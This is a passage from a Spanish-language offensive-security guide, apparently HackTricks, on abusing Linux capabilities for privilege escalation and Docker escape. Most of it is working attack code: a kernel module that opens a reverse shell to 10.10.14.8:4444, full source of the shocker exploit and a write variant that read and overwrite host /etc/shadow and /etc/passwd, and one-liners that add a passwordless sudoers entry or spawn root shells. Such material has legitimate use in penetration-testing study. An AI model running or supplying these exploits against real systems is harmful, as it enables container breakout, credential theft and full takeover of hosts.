Finalmente, ejecuta el código Python necesario para cargar este módulo del kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Ejemplo 2 con binario**

En el siguiente ejemplo, el binario **`kmod`** tiene esta capacidad.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Lo que significa que es posible usar el comando **`insmod`** para insertar un módulo del kernel. Sigue el ejemplo a continuación para obtener una **shell inversa** abusando de este privilegio.

**Ejemplo con entorno (Escape de Docker)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior se puede ver que la capacidad **SYS\_MODULE** está habilitada.

**Cree** el **módulo del kernel** que ejecutará un shell inverso y el **Makefile** para **compilarlo**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
¡El espacio en blanco antes de cada palabra make en el archivo Makefile **debe ser un tabulador, no espacios**!
{% endhint %}

Ejecuta `make` para compilarlo.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Finalmente, inicia `nc` dentro de una shell y **carga el módulo** desde otra y capturarás la shell en el proceso de nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**El código de esta técnica fue copiado del laboratorio de "Abusing SYS\_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Otro ejemplo de esta técnica se puede encontrar en [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a un proceso **burlar los permisos para leer archivos y para leer y ejecutar directorios**. Su uso principal es para buscar archivos o leerlos. Sin embargo, también permite a un proceso utilizar la función `open_by_handle_at(2)`, que puede acceder a cualquier archivo, incluidos aquellos fuera del espacio de nombres de montaje del proceso. El identificador utilizado en `open_by_handle_at(2)` se supone que es un identificador no transparente obtenido a través de `name_to_handle_at(2)`, pero puede incluir información sensible como números de inodo que son vulnerables a manipulación. El potencial de explotación de esta capacidad, particularmente en el contexto de contenedores Docker, fue demostrado por Sebastian Krahmer con el exploit shocker, como se analiza [aquí](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Esto significa que puedes** **burlar los controles de permisos de lectura de archivos y los controles de permisos de lectura/ejecución de directorios.**

**Ejemplo con binario**

El binario podrá leer cualquier archivo. Por lo tanto, si un archivo como tar tiene esta capacidad, podrá leer el archivo shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Ejemplo con binary2**

En este caso supongamos que el binario **`python`** tiene esta capacidad. Para listar archivos de root podrías hacer:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Y para leer un archivo podrías hacerlo:
```python
print(open("/etc/shadow", "r").read())
```
**Ejemplo en el entorno (fuga de Docker)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior puedes ver que la capacidad **DAC\_READ\_SEARCH** está habilitada. Como resultado, el contenedor puede **depurar procesos**.

Puedes aprender cómo funciona la siguiente explotación en [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) pero en resumen **CAP\_DAC\_READ\_SEARCH** no solo nos permite atravesar el sistema de archivos sin controles de permisos, sino que también elimina explícitamente cualquier verificación a _**open\_by\_handle\_at(2)**_ y **podría permitir que nuestro proceso acceda a archivos sensibles abiertos por otros procesos**.

El exploit original que abusa de estos permisos para leer archivos del host se puede encontrar aquí: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), la siguiente es una **versión modificada que te permite indicar el archivo que deseas leer como primer argumento y volcarlo en un archivo**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
El exploit necesita encontrar un puntero a algo montado en el host. El exploit original usaba el archivo /.dockerinit y esta versión modificada usa /etc/hostname. Si el exploit no funciona, tal vez necesites configurar un archivo diferente. Para encontrar un archivo montado en el host, simplemente ejecuta el comando mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**El código de esta técnica fue copiado del laboratorio de "Abusing DAC\_READ\_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro crucial para profesionales de tecnología y ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Esto significa que puedes evadir las comprobaciones de permisos de escritura en cualquier archivo, por lo que puedes escribir en cualquier archivo.**

Hay muchos archivos que puedes **sobrescribir para escalar privilegios,** [**puedes obtener ideas desde aquí**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Ejemplo con binario**

En este ejemplo, vim tiene esta capacidad, por lo que puedes modificar cualquier archivo como _passwd_, _sudoers_ o _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Ejemplo con el binario 2**

En este ejemplo, el binario **`python`** tendrá esta capacidad. Podrías usar python para anular cualquier archivo:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Ejemplo con entorno + CAP_DAC_READ_SEARCH (Escape de Docker)**

Puedes verificar las capacidades habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Primero, lee la sección anterior que [**abusa de la capacidad DAC\_READ\_SEARCH para leer archivos arbitrarios**](linux-capabilities.md#cap\_dac\_read\_search) del host y **compila** el exploit.\
Luego, **compila la siguiente versión del exploit shocker** que te permitirá **escribir archivos arbitrarios** en el sistema de archivos del host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Para escapar del contenedor de Docker, podrías **descargar** los archivos `/etc/shadow` y `/etc/passwd` del host, **añadir** un **nuevo usuario** a ellos y usar **`shocker_write`** para sobrescribirlos. Luego, **acceder** a través de **ssh**.

**El código de esta técnica fue copiado del laboratorio de "Abusing DAC\_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Esto significa que es posible cambiar la propiedad de cualquier archivo.**

**Ejemplo con binario**

Supongamos que el binario **`python`** tiene esta capacidad, puedes **cambiar** el **propietario** del archivo **shadow**, **cambiar la contraseña de root** y escalar privilegios:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
O con el binario **`ruby`** teniendo esta capacidad:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Esto significa que es posible cambiar los permisos de cualquier archivo.**

**Ejemplo con binario**

Si Python tiene esta capacidad, puedes modificar los permisos del archivo shadow, **cambiar la contraseña de root** y escalar privilegios:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Esto significa que es posible establecer el id de usuario efectivo del proceso creado.**

**Ejemplo con binario**

Si python tiene esta **capacidad**, puedes abusar fácilmente de ella para escalar privilegios a root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Otra forma:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Esto significa que es posible establecer el id de grupo efectivo del proceso creado.**

Hay muchos archivos que puedes **sobrescribir para escalar privilegios,** [**puedes obtener ideas desde aquí**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Ejemplo con binario**

En este caso, debes buscar archivos interesantes que un grupo pueda leer porque puedes suplantar a cualquier grupo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Una vez que hayas encontrado un archivo que puedas abusar (ya sea leyendo o escribiendo) para escalar privilegios, puedes **obtener un shell haciéndote pasar por el grupo de interés** con:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
En este caso, el grupo shadow fue suplantado para poder leer el archivo `/etc/shadow`:
```bash
cat /etc/shadow
```
Si **docker** está instalado, podrías **hacerte pasar** por el **grupo docker** y abusar de él para comunicarte con el [**socket de docker** y escalar privilegios](./#writable-docker-socket).

## CAP\_SETFCAP

**Esto significa que es posible establecer capacidades en archivos y procesos**

**Ejemplo con binario**

Si Python tiene esta **capacidad**, puedes abusar fácilmente de ella para escalar privilegios a root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Ten en cuenta que si estableces una nueva capacidad en el binario con CAP\_SETFCAP, perderás esta capacidad.
{% endhint %}

Una vez que tengas la [capacidad SETUID](linux-capabilities.md#cap\_setuid) puedes ir a su sección para ver cómo escalar privilegios.

**Ejemplo con entorno (escape de Docker)**

Por defecto, la capacidad **CAP\_SETFCAP se otorga al proceso dentro del contenedor en Docker**. Puedes verificarlo haciendo algo como:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Esta capacidad permite **dar cualquier otra capacidad a los binarios**, por lo que podríamos pensar en **escapar** del contenedor **abusando de cualquiera de las otras vulnerabilidades de capacidad** mencionadas en esta página.\
Sin embargo, si intentas dar, por ejemplo, las capacidades CAP\_SYS\_ADMIN y CAP\_SYS\_PTRACE al binario gdb, descubrirás que puedes dárselas, pero el **binario no podrá ejecutarse después de esto**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Desde la documentación](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Este es un **subconjunto limitante para las capacidades efectivas** que el hilo puede asumir. También es un subconjunto limitante para las capacidades que pueden ser agregadas al conjunto heredable por un hilo que **no tiene la capacidad CAP\_SETPCAP** en su conjunto efectivo._\
Parece que las capacidades Permitidas limitan las que se pueden utilizar.\
Sin embargo, Docker también otorga el **CAP\_SETPCAP** por defecto, por lo que es posible **establecer nuevas capacidades dentro de las heredables**.\
Sin embargo, en la documentación de esta capacidad: _CAP\_SETPCAP: \[...\] **agregar cualquier capacidad del conjunto de límites del hilo que llama** a su conjunto heredable_.\
Parece que solo podemos agregar al conjunto heredable capacidades del conjunto de límites. Lo que significa que **no podemos colocar nuevas capacidades como CAP\_SYS\_ADMIN o CAP\_SYS\_PTRACE en el conjunto heredable para escalar privilegios**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proporciona una serie de operaciones sensibles que incluyen acceso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, modificar `mmap_min_addr`, acceder a las llamadas al sistema `ioperm(2)` y `iopl(2)`, y varios comandos de disco. La `ioctl(2)` de `FIBMAP` también está habilitada a través de esta capacidad, lo que ha causado problemas en el [pasado](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Según la página del manual, esto también permite al titular `realizar descriptivamente una serie de operaciones específicas de dispositivos en otros dispositivos`.

Esto puede ser útil para **escalada de privilegios** y **escape de Docker**.

## CAP\_KILL

**Esto significa que es posible matar cualquier proceso.**

**Ejemplo con binario**

Supongamos que el binario **`python`** tiene esta capacidad. Si también pudieras **modificar alguna configuración de servicio o socket** (o cualquier archivo de configuración relacionado con un servicio), podrías instalar un acceso trasero y luego matar el proceso relacionado con ese servicio y esperar a que se ejecute el nuevo archivo de configuración con tu acceso trasero.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privilegio elevado con kill**

Si tienes capacidades de kill y hay un **programa de nodo ejecutándose como root** (o como un usuario diferente), probablemente puedas **enviarle** la **señal SIGUSR1** y hacer que **abra el depurador de nodo** para que puedas conectarte.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro crucial para profesionales de tecnología y ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Esto significa que es posible escuchar en cualquier puerto (incluso en los privilegiados).** No se puede escalar privilegios directamente con esta capacidad.

**Ejemplo con binario**

Si **`python`** tiene esta capacidad, podrá escuchar en cualquier puerto e incluso conectarse desde él a cualquier otro puerto (algunos servicios requieren conexiones desde puertos específicos de privilegios)

{% tabs %}
{% tab title="Escuchar" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Conectar" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a los procesos **crear sockets RAW y PACKET**, lo que les permite generar y enviar paquetes de red arbitrarios. Esto puede llevar a riesgos de seguridad en entornos contenerizados, como suplantación de paquetes, inyección de tráfico y eludir controles de acceso a la red. Actores maliciosos podrían explotar esto para interferir con el enrutamiento de contenedores o comprometer la seguridad de la red del host, especialmente sin protecciones de firewall adecuadas. Además, **CAP_NET_RAW** es crucial para que los contenedores privilegiados admitan operaciones como ping a través de solicitudes ICMP RAW.

**Esto significa que es posible espiar el tráfico.** No se puede escalar privilegios directamente con esta capacidad.

**Ejemplo con un binario**

Si el binario **`tcpdump`** tiene esta capacidad, podrás usarlo para capturar información de red.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Ten en cuenta que si el **entorno** proporciona esta capacidad, también podrías usar **`tcpdump`** para espiar el tráfico.

**Ejemplo con binario 2**

El siguiente ejemplo es un código en **`python2`** que puede ser útil para interceptar el tráfico de la interfaz "**lo**" (**localhost**). El código es del laboratorio "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

La capacidad [**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) otorga al titular el poder de **alterar configuraciones de red**, incluidas las configuraciones de firewall, tablas de enrutamiento, permisos de socket y configuraciones de interfaz de red dentro de los espacios de nombres de red expuestos. También permite activar el **modo promiscuo** en interfaces de red, lo que permite el espionaje de paquetes en todos los espacios de nombres.

**Ejemplo con binario**

Supongamos que el **binario de python** tiene estas capacidades.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Esto significa que es posible modificar los atributos del inode.** No se puede escalar privilegios directamente con esta capacidad.

**Ejemplo con binario**

Si descubres que un archivo es inmutable y python tiene esta capacidad, puedes **eliminar el atributo inmutable y hacer que el archivo sea modificable:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
